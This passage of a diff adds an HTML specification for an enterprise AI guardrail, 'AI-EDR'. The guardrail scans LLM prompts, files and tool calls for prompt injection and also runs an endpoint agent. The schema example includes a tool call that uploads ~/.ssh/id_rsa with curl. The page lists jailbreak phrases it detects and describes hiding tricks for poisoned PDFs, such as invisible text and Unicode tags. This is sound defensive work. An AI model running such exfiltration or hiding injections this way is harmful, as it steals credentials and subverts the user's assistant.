+      <p>All five adapters normalize incoming traffic into <code>CanonicalAIEDRRequest</code> before it reaches the Security Guard. As built:</p>
+      <div class="codebox">
+        <div class="code-head"><span>CanonicalAIEDRRequest · src/schemas/canonical.py</span><button type="button" class="copy" id="copy-schema" data-target="schema-json">Copy</button></div>
+<pre id="schema-json" data-lang="json"><code>{
+  "request_id": "uuid-v4",
+  "timestamp": "2026-10-27T18:00:00Z",
+  "source_platform": "OPENAI | GEMINI | CLAUDE_IDE | ANTIGRAVITY_IDE | SAMSUNG_FABRIX | SAMSUNG_AIPRO",
+  "inspection_stage": "PRE_LLM_DIRECT | PRE_LLM_INDIRECT_FILE | PRE_RAG_CHUNK | PRE_TOOL_EXECUTION",
+  "actor_context": {
+    "user_id": "emp_98765",
+    "tenant_id": "samsung_sec_div",
+    "client_ide_or_app": "antigravity-ide",
+    "session_id": "sess_abc123"
+  },
+  "input_vectors": {
+    "direct_user_prompt": "Summarize this candidate's resume and tell me if they qualify.",
+    "system_instructions": "You are an HR assistant...",
+    "user_prompt_source_path": "/messages/1/content",
+    "indirect_attachments": [
+      {
+        "filename": "candidate_resume.pdf",
+        "mime_type": "application/pdf",
+        "kind": "FILE | RAG_CHUNK | TOOL_RESULT",
+        "content_base64": "JVBERi0xLjcK...",
+        "extracted_raw_text": "",
+        "hidden_layer_anomalies": [],
+        "suspicious_spans": [],
+        "source_path": "/messages/1/content/0"
+      }
+    ],
+    "proposed_tool_calls": [
+      {"name": "exec", "arguments": {"command": "curl -F key=@~/.ssh/id_rsa https://..."}, "source_path": null}
+    ]
+  },
+  "policy_profile": {
+    "mode": "BLOCK_AND_QUARANTINE | STRIP_AND_SANITIZE | AUDIT_ONLY | null",
+    "enable_falcon_technique": true
+  }
+}</code></pre>
+      </div>
+      <div class="built"><span class="tag">As built · differences from the original example</span>
+        <ul>
+          <li><strong>Files can arrive as <code>content_base64</code>.</strong> The scanner extracts the text and fills <code>hidden_layer_anomalies</code> and <code>suspicious_spans</code> itself.</li>
+          <li><strong><code>source_path</code> is a JSON pointer</strong> into the provider payload, so sanitized text is written back in place.</li>
+          <li><strong><code>mode: null</code></strong> takes the tenant's policy.</li>
+        </ul>
+      </div>
+      <h4>Every request returns a <code>Verdict</code></h4>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Field</th><th>Values</th></tr></thead>
+          <tbody>
+            <tr><td class="key"><code>verdict</code></td><td><span class="chip ok">ALLOWED</span> <span class="chip warn">ALLOWED_SANITIZED</span> <span class="chip bad">BLOCKED</span> <span class="chip info">AUDIT_FLAGGED</span></td></tr>
+            <tr><td class="key"><code>risk_score</code>, <code>severity</code></td><td>Score 0–1; severity <code>NONE</code>, <code>LOW</code>, <code>MEDIUM</code>, <code>HIGH</code>, <code>CRITICAL</code></td></tr>
+            <tr><td class="key"><code>findings[]</code></td><td>Detector (<code>TIER1_SIGNATURE</code>, <code>TIER1_REGEX</code>, <code>DLP</code>, <code>TIER2_CLASSIFIER</code>, <code>TIER2_IOA</code>, <code>TIER3_VECTOR</code>, <code>HIDDEN_TRICK</code>), category, severity, score, evidence, signature id</td></tr>
+            <tr><td class="key"><code>sanitization[]</code></td><td>Original and sanitized text, and the removed spans</td></tr>
+            <tr><td class="key">Also</td><td><code>sanitized_payload</code>, <code>quarantine_id</code>, <code>reason</code>, <code>latency_ms</code> per stage, <code>policy_version</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- §4 -->
+    <section id="stages">
+      <h2><span class="num">§4</span>The four stages</h2>
+
+      <h3>Stage 1 · Attack surface collectors</h3>
+      <ul>
+        <li><strong>Direct attack collector:</strong> captures active user prompts from chat UIs, IDE chat boxes and API calls.</li>
+        <li><strong>Indirect attack and file-poisoning inspector (<code>IndirectFileScanner</code>):</strong> covers the poisoned-PDF-résumé vector. It parses PDFs, Word documents, Markdown, HTML and source code before they enter the LLM context window.</li>
+      </ul>
+      <h4>Hidden-trick detectors</h4>
+      <ul>
+        <li><strong>Visual vs. text-layer diffing:</strong> text in the PDF stream with <code>font_size &lt;= 1pt</code>, opacity 0, rendering mode 3 (invisible), or foreground color equal to the background (<code>#FFFFFF</code> on <code>#FFFFFF</code>).</li>
+        <li><strong>Unicode smuggling and homoglyphs:</strong> Unicode tag characters (<code>U+E0000</code>–<code>U+E007F</code>), zero-width joiners, bidirectional overrides (<code>U+202E</code>).</li>
+        <li><strong>Metadata and comment injection:</strong> PDF <code>/Info</code> dictionaries, XMP metadata, HTML comments and code comments that carry imperative LLM instructions.</li>
+      </ul>
+      <div class="built"><span class="tag">As built</span><p>PyMuPDF and pdfplumber for PDF, python-docx for Word. Results are cached by content hash: a 20 KB file costs p50 226 ms on the first scan and nothing after.</p></div>
+
+      <h3>Stage 2 · The threat data (AI Risk Database)</h3>
+      <div class="table-wrap wide-table">
+        <table>
+          <thead><tr><th>Component</th><th>Holds</th><th>As built</th></tr></thead>
+          <tbody>
+            <tr><td class="key">Hot signature cache</td><td>Exact and fuzzy patterns of known jailbreaks (DAN, Developer Mode, “ignore previous rules”, system-prompt extraction), toxic commands, enterprise DLP secrets</td><td>In-process Aho-Corasick trie (<code>pyahocorasick</code>) plus regex rules, rebuilt on promotion, seeded from <code>config/initial_risk_signatures.json</code>. Redis pub/sub distributes it in production</td></tr>
+            <tr><td class="key">Semantic threat vector DB</td><td>Embeddings of known direct and indirect injections, by category: <code>INSTRUCTION_OVERRIDE</code>, <code>INDIRECT_PDF_POISONING</code>, <code>TOOL_HIJACK</code>, <code>DATA_EXFILTRATION</code></td><td>In-process numpy index with a feature-hashing embedder. Qdrant and a neural embedder are drop-in replacements (<code>requirements-ml.txt</code>, <code>AI_EDR_EMBEDDER=onnx</code>)</td></tr>
+            <tr><td class="key">Falcon threat intel sync</td><td>Newly trapped attacks from Stage 3, so an attack blocked on ChatGPT is then blocked on Gemini, Claude, FabriX and AI Pro</td><td>See §2 (Falcon Loop) and §8</td></tr>
+            <tr><td class="key">Persistent AI Risk DB <span class="chip info">added 31 Oct</span></td><td>Every entry, kept by the control plane</td><td>SQLite in WAL mode, schema ready for Postgres. 61 seed entries plus learned and analyst entries, each mapped to the OWASP Top 10 for LLM Applications (2025) and a MITRE ATLAS technique</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Stage 3 · The Security Guard (inline guardrail + Falcon engine)</h3>
+      <p>When a <code>CanonicalAIEDRRequest</code> arrives, the Security Guard runs three operations.</p>
+      <h4>1 · Checks for hidden tricks (<code>HiddenTrickAnalyzer</code>)</h4>
+      <p>Structural anomalies, invisible PDF text, encoded payloads (Base64, hex, ROT13) and token-splitting attacks.</p>
+      <h4>2 · Validates against the AI Risk Database with the Falcon technique (<code>FalconThreatEvaluator</code>)</h4>
+      <div class="table-wrap wide-table">
+        <table>
+          <thead><tr><th>Tier</th><th>What it does</th><th>As built</th></tr></thead>
+          <tbody>
+            <tr><td class="key">Tier 1 · deterministic</td><td>Aho-Corasick and regex scan against the Risk DB, plus the secret and PII DLP scanner</td><td>Under 2 ms</td></tr>
+            <tr><td class="key">Tier 2 · Falcon classifier</td><td>In-memory ONNX classification gives an <code>injection_probability_score</code> from 0.0 to 1.0, alongside behavioral IOAs (e.g. untrusted data issuing orders to the system role) and the agent process tree</td><td>DeBERTa-v3 cascade (§2, Layer B); threshold 0.80; median about 17 ms per prompt</td></tr>
+            <tr><td class="key">Tier 3 · semantic match</td><td>Cosine similarity to known and Falcon-learned attack vectors catches polymorphic variants</td><td>τ = 0.80 with the hashing embedder (the plan's 0.88 is for a neural embedder); under 5 ms</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="formula" role="figure" aria-label="Cosine similarity between the input embedding and a Risk DB embedding">
+        <math display="block">
+          <mrow>
+            <mtext>Similarity</mtext><mo stretchy="false">(</mo><msub><mi>E</mi><mtext>input</mtext></msub><mo>,</mo><msub><mi>E</mi><mtext>risk_db</mtext></msub><mo stretchy="false">)</mo>
+            <mo>=</mo>
+            <mfrac>
+              <mrow><msub><mi>E</mi><mtext>input</mtext></msub><mo>·</mo><msub><mi>E</mi><mtext>risk_db</mtext></msub></mrow>
+              <mrow><mo stretchy="false">‖</mo><msub><mi>E</mi><mtext>input</mtext></msub><mo stretchy="false">‖</mo><mspace width="0.2em"/><mo stretchy="false">‖</mo><msub><mi>E</mi><mtext>risk_db</mtext></msub><mo stretchy="false">‖</mo></mrow>
+            </mfrac>
+          </mrow>
+        </math>
+        <p>Flagged as a variant of a known attack when Similarity ≥ τ.</p>
+      </div>
+      <p><strong>Scoring</strong>, set per tenant in <code>config/ai_edr_policies.yaml</code>:</p>
+      <ul>
+        <li>Weights: classifier 0.55, IOA 0.35, anomaly 0.10.</li>
+        <li>Severity bands: LOW 0.30, MEDIUM 0.50, HIGH 0.70, CRITICAL 0.90.</li>
+        <li>DLP: secrets BLOCK; PII and proprietary markers AUDIT.</li>
+        <li>Detector errors fail CLOSED by default.</li>
+      </ul>
+      <h4>3 · Strips bad commands, or blocks and quarantines (<code>DecisionAndRemediationEngine</code>)</h4>
+      <div class="paths">
+        <div class="path a">
+          <h4>Path A · malicious input → BLOCKED, trapped</h4>
+          <ul>
+            <li>A direct attack or high-severity indirect injection short-circuits the request at once.</li>
+            <li>The payload goes to the Quarantine Vault with full forensic metadata: user ID, file hash, matched signature, Falcon IOA score.</li>
+            <li>The AI Brain is never called: 0 tokens spent.</li>
+          </ul>
+        </div>
+        <div class="path b">
+          <h4>Path B · recoverable injection → STRIPPED, allowed</h4>
+          <ul>
+            <li>Under <code>STRIP_AND_SANITIZE</code>, the hidden or malicious spans are removed from the document.</li>
+            <li>The rest is wrapped in spotlighting delimiters, <code>&lt;untrusted_document_content&gt;…&lt;/untrusted_document_content&gt;</code>.</li>
+            <li>The clean, safe input goes on to the AI Brain.</li>
+          </ul>
+        </div>
+      </div>
+      <div class="built"><span class="tag">As built</span>
+        <ul>
+          <li>STRIP mode strips indirect findings up to <code>max_strip_severity</code> (default CRITICAL), and blocks if the re-scan still scores 0.7 or more.</li>
+          <li>The Quarantine Vault is SQLite plus a JSONL SIEM sink in CEF style.</li>
+          <li>Analysts confirm or release payloads in the SOC console (<code>/console</code>).</li>
+        </ul>
+      </div>
+
+      <h3>Stage 4 · The AI Brain (protected downstream LLM)</h3>
+      <ul>
+        <li>Only clean, safe input reaches ChatGPT, Gemini, Claude, Samsung FabriX or Samsung AI Pro.</li>
+        <li>Because hidden tricks and override commands are stripped or blocked first, the model's safety rules stay intact and it returns a helpful, safe answer.</li>
+      </ul>
+      <div class="built"><span class="tag">As built</span><p>For demos without API keys, <code>src/mock_llm/vulnerable_brain.py</code> is a deliberately gullible model that obeys injected instructions and speaks all five wire formats. Calling it directly shows what happens without AI-EDR.</p></div>
+    </section>
+
+    <!-- §5 -->
+    <section id="repository">
+      <h2><span class="num">§5</span>Repository structure, as built</h2>
+      <p>The proposed <code>src/</code> layout was followed. The build added the endpoint agent, the integrations, the control plane, the portal and CI.</p>
+      <div class="codebox">
+<pre data-lang="tree"><code>.
+├── README.md · architecture.md · discussion.md
+├── enterprise_ai_security_guardrail_specification.md   # this spec (originally ANTIGRAVITY_GUARDRAIL_SPEC.md)
+├── Dockerfile · docker-compose.yml · requirements.txt · requirements-ml.txt
+├── config/
+│   ├── ai_edr_policies.yaml               # tenant policies, thresholds, DLP, Falcon Loop limits
+│   ├── initial_risk_signatures.json       # Risk DB seed
+│   ├── classifier_training.json           # local n-gram classifier data (EN + KO)
+│   └── gate_corpus.json                   # release quality gate: 35 attacks + 40 benign texts
+├── src/
+│   ├── main.py · settings.py              # FastAPI app: proxy routes, hook API, console, portal
+│   ├── schemas/                           # canonical.py, quarantine.py
+│   ├── adapters/                          # OpenAI, Gemini, Claude, FabriX, AI Pro
+│   ├── collectors/                        # direct_prompt_collector.py, indirect_file_scanner.py
+│   ├── risk_database/                     # signature_store, vector_threat_db, embedder, falcon_threat_feed
+│   ├── ai_edr_guard/                      # pipeline_orchestrator, hidden_trick_analyzer, behavioral_ioa, falcon_engine,
+│   │                                      #   command_stripper_cdr, decision_engine, quarantine_vault
+│   ├── proxy_router/                      # upstream_dispatcher.py, hook_webhook_controller.py
+│   ├── control_plane/                     # fleet API (/v1/cp), persistent Risk DB, signed content, OWASP/ATLAS taxonomy
+│   ├── portal/ · demo_console/            # fleet portal (/portal), SOC console (/console)
+│   └── mock_llm/                          # deliberately gullible model for offline demos
+├── agent/
+│   ├── checkpointd/                       # endpoint agent: daemon, local engine, sensors (process, files, eBPF, Windows driver)
+│   ├── kernel/linux/                      # BPF LSM program + libbpf loader
+│   ├── kernel/windows/                    # minifilter driver (checkpoint.sys), INF, Visual Studio project
+│   └── windows/install.ps1                # installs checkpointd as a SYSTEM task
+├── integrations/                          # claude_code, gemini_cli, browser_extension, samsung, sdk_examples
+├── scripts/                               # live demo, fleet demo, Linux kernel demo, model download
+├── demo/ · docs/ · presentation/
+├── tests/                                 # 120 tests: the 4 proposed files plus control plane, agent, Windows, kernel
+└── .github/workflows/endpoint-agent.yml   # CI: Windows agent live test, driver build, Linux BPF build</code></pre>
+      </div>
+    </section>
+
+    <!-- §6 -->
+    <section id="prompts">
+      <h2><span class="num">§6</span>Build prompts for Gemini in Antigravity IDE</h2>
+      <p>These prompts drove the first build on 27–28 Oct 2026 and are kept as history. The <code>@ANTIGRAVITY_GUARDRAIL_SPEC.md</code> they refer to is this spec.</p>
+      <ol class="prompts">
+        <li><b>Core schemas and multi-platform adapters</b><q>Read <code>@ANTIGRAVITY_GUARDRAIL_SPEC.md</code>. Implement <code>src/schemas/canonical.py</code> and all 5 provider adapters in <code>src/adapters/</code> (OpenAI ChatGPT, Google Gemini, Anthropic Claude, Samsung FabriX, and Samsung AI Pro <code>aipro</code>) so any incoming prompt or file attachment is normalized into <code>CanonicalAIEDRRequest</code>.</q></li>
+        <li><b>Stage 1: poisoned PDF and indirect attack scanner</b><q>Read <code>@ANTIGRAVITY_GUARDRAIL_SPEC.md</code>. Implement <code>src/collectors/indirect_file_scanner.py</code> and <code>src/ai_edr_guard/hidden_trick_analyzer.py</code> to detect indirect prompt injections hidden in files (like a poisoned PDF resume with white-on-white text, zero-point fonts, metadata injections, or hidden Unicode tags).</q></li>
+        <li><b>Stages 2 and 3: AI Risk Database and the Falcon engine</b><q>Read <code>@ANTIGRAVITY_GUARDRAIL_SPEC.md</code>. Implement the <code>risk_database/</code> module and <code>src/ai_edr_guard/falcon_engine.py</code>, <code>command_stripper_cdr.py</code>, and <code>quarantine_vault.py</code>. Include the Falcon Technique (behavioral IOA scoring, local ONNX classifier integration, surgical command stripping, and the real-time Quarantine-to-Risk-DB feedback loop).</q></li>
+        <li><b>Stage 4: inline gateway, webhook API and end-to-end tests</b><q>Read <code>@ANTIGRAVITY_GUARDRAIL_SPEC.md</code>. Wire up the FastAPI application in <code>src/main.py</code> exposing both the inline Reverse Proxy endpoints and the <code>/v1/ai-edr/inspect</code> webhook for ChatGPT, Gemini, Claude, Samsung FabriX, and AI Pro, along with the unit tests in <code>tests/</code>.</q></li>
+      </ol>
+    </section>
+
+    <!-- §7 -->
+    <section id="endpoint">
+      <h2><span class="num">§7</span>Endpoint agent and kernel checkpoints (CheckPoint Zero)</h2>
+      <p>Hooks and extensions protect the tools that use them. The endpoint agent protects the machine, including AI tools that have no hooks.</p>
+      <p><code>checkpointd</code> runs on each machine with the detection engine embedded. It makes no cloud call and works offline. It judges only processes descended from an AI agent: by default <code>claude</code>, <code>gemini</code>, <code>cursor</code>, <code>aider</code>, <code>codex</code>, <code>copilot</code>, <code>ollama</code> and similar, changeable with <code>--ai-process</code>.</p>
+      <div class="table-wrap wide-table">
+        <table>
+          <thead><tr><th>Checkpoint</th><th>Behaviour</th></tr></thead>
+          <tbody>
+            <tr><td class="key">Exec</td><td>Rebuilds the lineage of every new process and judges commands in POSIX and Windows forms (<code>%USERPROFILE%</code>, <code>$env:USERPROFILE</code>, <code>curl.exe</code>, PowerShell download cmdlets):
+              <ul>
+                <li>Credential path + network tool → <span class="chip bad">CRITICAL TOOL_HIJACK</span></li>
+                <li>Credential read → <code>SECRET_ACCESS</code></li>
+                <li>Destructive commands, Windows included (shadow-copy deletion, <code>wbadmin</code>, <code>bcdedit</code>, <code>cipher /w</code>) → block</li>
+                <li>Download-or-execute abuse of <code>certutil</code>, <code>bitsadmin</code>, <code>mshta</code>, <code>regsvr32</code>, <code>rundll32</code> → alert</li>
+                <li>Anything else → the full pipeline, as a tool call</li>
+              </ul>
+              ENFORCE mode kills the process tree.</td></tr>
+            <tr><td class="key">File</td><td>Pre-scans documents in watched workspaces. A poisoned file is moved to quarantine and <code>&lt;name&gt;.sanitized.txt</code> is written in its place</td></tr>
+            <tr><td class="key">Egress</td><td>AI-lineage connections outside the allow-list (LLM APIs, GitHub, package registries, private ranges) → alert, or kill with <code>--block-egress</code></td></tr>
+            <tr><td class="key">Content</td><td>Ed25519-signed Risk DB bundles are verified (signature and SHA-256) and hot-swapped; on any failure the last good bundle is kept</td></tr>
+            <tr><td class="key">Safety</td><td>Safe mode (monitor only) after 2 unclean exits; fail-open on detector errors; offline outbox with idempotent event IDs</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Kernel checkpoints by OS</h3>
+      <p>The kernel only enforces lists that <code>checkpointd</code> fills; it never parses content. Detail is in <code>architecture.md</code> §20.1.</p>
+      <div class="table-wrap wide-table">
+        <table>
+          <thead><tr><th></th><th>Linux</th><th>Windows</th><th>macOS</th></tr></thead>
+          <tbody>
+            <tr><td class="key">Mechanism</td><td>BPF LSM program (<code>agent/kernel/linux</code>)</td><td>File-system minifilter + process-creation callback (<code>agent/kernel/windows</code>)</td><td>User-space sensors only</td></tr>
+            <tr><td class="key">In the kernel</td><td>AI lineage tracked on fork and exec; credential-file reads and unapproved connections refused with <code>EPERM</code></td><td>New AI-lineage processes held up to 250 ms for the agent's verdict; credential-file opens refused</td><td>—</td></tr>
+            <tr><td class="key">Status</td><td><span class="chip ok">Verified</span><br>8/8 live kernel tests (Fedora 44, kernel 6.19)</td><td><span class="chip warn">Built, not loaded</span><br>Needs driver signing and a Microsoft altitude</td><td><span class="chip neutral">Not started</span><br>Needs Apple's Endpoint Security entitlement</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <h4>Install</h4>
+      <ul>
+        <li><strong>Linux:</strong> <code>make -C agent/kernel/linux</code>, then run the agent as root; it attaches the kernel program automatically.</li>
+        <li><strong>Windows:</strong> <code>agent/windows/install.ps1</code> runs the agent as a SYSTEM scheduled task and protects every user's credential stores.</li>
+        <li><strong>macOS:</strong> <code>python -m agent.checkpointd</code>.</li>
+      </ul>
+    </section>
+
+    <!-- §8 -->
+    <section id="control-plane">
+      <h2><span class="num">§8</span>Control plane, content pipeline and portal</h2>
+      <p>The control plane (<code>src/control_plane/</code>, mounted at <code>/v1/cp</code> in the gateway app) handles agent enrollment, heartbeat and telemetry, and releases Risk DB content through a fixed pipeline:</p>
+      <ol class="pipeline">
+        <li><b>Snapshot</b>Freeze the current Risk DB entries.</li>
+        <li><b>Quality gate</b>Replay 35 attacks (EN + KO) and 40 benign texts. Fail on any false positive, recall under 85%, or a recall drop over 5 points.</li>
+        <li><b>Sign</b>Ed25519 signature per tenant.</li>
+        <li><b>Ring rollout</b>CANARY → EARLY → BROAD → GA.</li>
+        <li><b>Auto-rollback</b>When 2 or more agents report a content failure.</li>
+      </ol>
+      <ul>
+        <li><strong>Learning loop:</strong> gateway promotions become tenant-tier <code>LEARNED</code> entries. Auto-release builds, gates and promotes them to CANARY only.</li>
+        <li><strong>Portal</strong> (<code>/portal</code>): overview; detections with process lineage; endpoints with ring and mode control; Risk DB with OWASP/ATLAS mapping, where analysts approve, disable or mark false positives; releases with gate, promote and rollback; deploy; audit log.</li>
+      </ul>
+    </section>
+
+    <!-- §9 -->
+    <section id="results">
+      <h2><span class="num">§9</span>Results</h2>
+      <p>Measured, not estimated. Detection figures come from a fresh held-out attack set written after tuning and never tuned on.</p>
+      <div class="stats">
+        <div class="stat"><b>70%</b><span>Direct attacks blocked</span><small>7 of 10, fresh held-out set</small></div>
+        <div class="stat"><b class="warn">33%</b><span>Indirect attacks caught</span><small>2 of 6, the main gap</small></div>
+        <div class="stat"><b class="ok">0%</b><span>False positives</span><small>0/20 benign prompts and docs, 0/60 real source files</small></div>
+        <div class="stat"><b>17 ms</b><span>Added latency, p50</span><small>p95 60 ms per prompt, laptop CPU</small></div>
+        <div class="stat"><b>~5 s</b><span>Zero-day to canary</span><small>Korean attack learned at the gateway, signed, gate passed (88.6% recall, 0/40 FP)</small></div>
+        <div class="stat"><b>120</b><span>Automated tests</span><small>Gateway, adapters, Falcon, control plane, agent, Windows, kernel</small></div>
+      </div>
+      <div class="table-wrap wide-table">
+        <table>
+          <thead><tr><th>Endpoint check</th><th>Result</th></tr></thead>
+          <tbody>
+            <tr><td class="key">macOS</td><td><span class="chip ok">Verified</span> Hijacked agent's exfiltration killed; poisoned PDF and README sanitized</td></tr>
+            <tr><td class="key">Linux, kernel checkpoint</td><td><span class="chip ok">Verified</span> 8/8 live kernel tests; a native agent's exfiltration refused at <code>connect()</code> inside the kernel</td></tr>
+            <tr><td class="key">Windows, GitHub Actions</td><td><span class="chip ok">Verified</span> Installed as SYSTEM; exfiltration killed before <code>curl</code> ran; 2 poisoned files sanitized</td></tr>
+            <tr><td class="key">Windows driver</td><td><span class="chip warn">Built</span> Compiles with <code>/W4 /WX</code>; InfVerif and Inf2Cat pass; <code>/INTEGRITYCHECK</code> set</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- §10 -->
+    <section id="limits">
+      <h2><span class="num">§10</span>Known limits</h2>
+      <ul>
+        <li>Inputs only: model output is not inspected yet.</li>
+        <li>Indirect-attack recall on new phrasings (33%) and Korean coverage are the main gaps. The next step is a multilingual classifier.</li>
+        <li>Redis and Qdrant run as in-process stand-ins, and SQLite stands in for Postgres. There is one control-plane node and no SSO or RBAC on the portal yet.</li>
+        <li>The Windows driver has never been loaded. It needs test signing or attestation signing and a Microsoft-assigned altitude. Windows egress is still checked in user space (the production path is a WFP callout), and the Windows agent is not yet a protected (PPL) service.</li>
+        <li>The Linux kernel checkpoint needs <code>bpf</code> in the active LSM list, which Ubuntu does not enable by default. Egress denial covers IPv4 only.</li>
+        <li>The FabriX and AI Pro request formats are assumptions until Samsung provides the official schemas.</li>
+      </ul>
+    </section>
+  </main>
+</div>
+
+<footer class="wrap">
+  <p>HTML edition of <code>enterprise_ai_security_guardrail_specification.md</code> · status 2 Nov 2026 · Team CheckPoint Zero</p>
+</footer>
+
+<script>
+(() => {
+  const esc = s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  // JSON: color keys, strings and literals
+  for (const code of document.querySelectorAll('pre[data-lang="json"] code')) {
+    code.innerHTML = esc(code.textContent).replace(
+      /("(?:[^"\\]|\\.)*")(\s*:)?|\b(true|false|null)\b|(-?\b\d+(?:\.\d+)?\b)/g,
+      (m, str, colon, lit, num) => str
+        ? (colon ? `<span class="k">${str}</span>${colon}` : `<span class="s">${str}</span>`)
+        : `<span class="l">${lit || num}</span>`);
+  }
+
+  // Directory tree: dim the comments
+  for (const code of document.querySelectorAll('pre[data-lang="tree"] code')) {
+    code.innerHTML = code.textContent.split("\n").map(line => {
+      const i = line.indexOf("#");
+      return i < 0 ? esc(line) : esc(line.slice(0, i)) + `<span class="c">${esc(line.slice(i))}</span>`;
+    }).join("\n");
+  }
+
+  // Copy buttons
+  for (const btn of document.querySelectorAll("button.copy")) {
+    btn.addEventListener("click", () => {
+      const pre = document.getElementById(btn.dataset.target);
+      const done = label => { btn.textContent = label; setTimeout(() => { btn.textContent = "Copy"; }, 1600); };
+      const select = () => {
+        const range = document.createRange();
+        range.selectNodeContents(pre);
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+        done("Selected");
+      };
+      try {
+        navigator.clipboard.writeText(pre.textContent).then(() => done("Copied"), select);
+      } catch (e) {
+        select();
+      }
+    });
+  }
+
+  // Contents: mark the section being read
+  const links = new Map([...document.querySelectorAll(".toc a")].map(a => [a.getAttribute("href").slice(1), a]));
+  if ("IntersectionObserver" in window) {
+    const io = new IntersectionObserver(entries => {
+      for (const e of entries) {
+        if (!e.isIntersecting) continue;
+        links.forEach(a => a.removeAttribute("aria-current"));
+        links.get(e.target.id)?.setAttribute("aria-current", "true");
+      }
+    }, { rootMargin: "-15% 0px -70% 0px" });
+    document.querySelectorAll("main section[id]").forEach(s => io.observe(s));
+  }
+})();
+</script>
+</body>
+</html>
